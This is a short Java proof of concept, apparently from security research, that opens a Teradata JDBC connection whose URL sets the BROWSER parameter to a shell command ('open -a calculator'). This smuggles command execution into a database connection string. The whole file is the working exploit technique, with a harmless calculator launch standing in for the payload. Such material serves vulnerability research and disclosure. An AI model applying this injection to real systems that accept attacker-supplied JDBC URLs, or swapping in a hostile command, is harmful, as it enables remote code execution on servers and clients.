package com.trganda;

import java.sql.DriverManager;
import java.sql.SQLException;

public class Main {
    public static void main(String[] args) throws SQLException {
        String url =
                "jdbc:teradata://127.0.0.1/DBS_PORT=10250,LOGMECH=BROWSER,BROWSER='open -a calculator',TYPE=DEFAULT,COP=OFF,TMODE=TERA,LOG=DEBUG";

        DriverManager.getConnection(url);
    }
}
